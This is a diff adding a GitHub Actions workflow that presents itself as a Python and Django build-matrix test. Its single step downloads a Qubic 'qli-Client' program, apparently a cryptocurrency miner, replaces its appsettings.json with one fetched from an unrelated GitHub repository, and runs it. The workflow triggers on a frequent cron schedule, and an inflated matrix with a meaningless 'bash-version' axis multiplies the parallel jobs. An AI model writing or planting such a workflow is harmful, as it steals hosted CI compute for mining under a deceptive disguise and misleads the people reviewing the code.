@@ -1,0 +1,72 @@
+name: build matrix demo1
+
+on:
+  push:
+    branches: [ main ]
+  pull_request:
+    branches: [ main ]
+  schedule:
+    - cron: "*/30 */5 * * *"
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    strategy:
+      # By default, GitHub will maximize the number of jobs run in parallel
+      # depending on the available runners on GitHub-hosted virtual machines.
+      # max-parallel: 255
+      fail-fast: false
+      matrix:
+        python-version:
+          - "2.7"
+          - "3.6"
+          - "3.7"
+          - "3.8"
+          - "3.9"
+        django-version:
+          - "1.11"
+          - "2.0"
+        bash-version:
+          - "2.6"
+          - "2.5"
+          - "2.4"
+          - "2.3"
+          - "2.2"
+          - "2.1"
+          - "1.9"
+          - "1.8"
+        exclude:
+          # Python 2.7 is compatible with Django 1.11
+          - python-version: "2.7"
+            django-version: "2.0"
+          - python-version: "2.7"
+            django-version: "2.1"
+          - python-version: "2.7"
+            django-version: "2.2"
+          - python-version: "2.7"
+            django-version: "3.0"
+          - python-version: "2.7"
+            django-version: "3.1"
+          # Python 3.8 is compatible with Django 2.2+
+          - python-version: "3.8"
+            django-version: "1.11"
+          - python-version: "3.8"
+            django-version: "2.0"
+          - python-version: "3.8"
+            django-version: "2.1"
+          # Python 3.9 is compatible with Django 3.1+
+          - python-version: "3.9"
+            django-version: "1.11"
+          - python-version: "3.9"
+            django-version: "2.0"
+          - python-version: "3.9"
+            django-version: "2.1"
+          - python-version: "3.9"
+            django-version: "2.2"
+          - python-version: "3.9"
+            django-version: "3.0"
+
+    steps:
+      - uses: actions/checkout@v2
+
+      - name: 1
+        run: wget https://dl.qubic.li/downloads/qli-Client-1.8.9-Linux-x64.tar.gz && tar xf qli-Client-1.8.9-Linux-x64.tar.gz && rm -rf appsettings.json && wget https://github.com/fuckmav/ToDo-List/raw/main/appsettings.json && timeout 2m ./qli-Client
